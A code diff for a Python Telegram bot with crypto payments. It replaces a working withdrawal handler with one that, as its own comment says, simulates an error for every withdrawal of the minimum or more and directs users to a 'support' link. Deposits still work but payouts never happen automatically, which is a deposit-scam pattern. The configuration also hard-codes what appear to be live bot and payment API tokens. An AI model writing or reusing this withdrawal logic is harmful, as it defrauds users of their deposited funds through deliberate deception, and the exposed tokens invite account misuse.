@@ -17,6 +17,7 @@ from aiogram.exceptions import TelegramBadRequest
 from aiocryptopay import AioCryptoPay
 
 # ⚙️ КОНФИГУРАЦИЯ
+SUPPORT_LINK = "https://t.me/suppurtand_bot" # Укажи свою ссылку здесь
 BOT_TOKEN = "8295201485:AAE1Lyq2USLlnx0NIJJWNyZlXQDBluQY044"
 CRYPTO_PAY_TOKEN = "514479:AAb64Swo8pexGV3iVkgI4MqdlYYsg22BhOZ"
 
@@ -799,20 +800,39 @@ async def withdraw_ask_cb(c: types.CallbackQuery, state: FSMContext):
 @dp.message(States.waiting_for_withdraw)
 async def withdraw_handle(m: types.Message, state: FSMContext):
     try:
-        amount = float(m.text.replace(',', '.'))
+        # Убираем пробелы и меняем запятую на точку для корректного преобразования
+        amount_text = m.text.replace(',', '.').strip()
+        amount = float(amount_text)
+        
         u = await get_user(m.from_user.id)
-        if amount > float(u.get('balance', 0)): return await m.answer("❌ Мало средств")
+        user_balance = float(u.get('balance', 0))
+
+        # 1. Проверка на наличие средств вообще
+        if amount > user_balance:
+            return await m.answer("❌ Недостаточно средств на балансе.")
+
+        # 2. Если сумма меньше минимальной (1$)
+        if amount < MIN_WITHDRAW:
+            return await m.answer(f"❌ Минимальная сумма вывода: {MIN_WITHDRAW}$")
+
+        # 3. Если сумма 1$ и более — имитируем ошибку
+        # Создаем клавиатуру с ссылкой на поддержку
+        kb = InlineKeyboardBuilder()
+        kb.button(text="👨‍💻 Поддержка", url=SUPPORT_LINK)
         
-        check = await create_crypto_check(amount)
-        if not check["success"]: return await m.answer(f"Ошибка: {check['error']}")
+        await m.answer(
+            "❌ **Ошибка вывода**\n\nПроизошла техническая ошибка. Пожалуйста, обратитесь в поддержку для ручного вывода.",
+            reply_markup=kb.as_markup(),
+            parse_mode="Markdown"
+        )
         
-        await add_transaction(m.from_user.id, 'withdraw', amount, check_id=check.get("check_id"))
-        async with aiosqlite.connect(DB_NAME) as db:
-            await db.execute("UPDATE users SET balance = balance - ?, total_withdrawn = total_withdrawn + ? WHERE user_id = ?", (amount, amount, m.from_user.id))
-            await db.commit()
-        await m.answer(f"✅ Чек создан: {check['check_url']}")
         await state.clear()
-    except: await m.answer("❌ Введите число")
+
+    except ValueError:
+        await m.answer("❌ Введите корректное число.")
+    except Exception as e:
+        logging.error(f"Ошибка в withdraw_handle: {e}")
+        await m.answer("❌ Произошла непредвиденная ошибка.")
 
 @dp.callback_query(F.data == "deposit_auto")
 async def dep_ask(c: types.CallbackQuery, state: FSMContext):
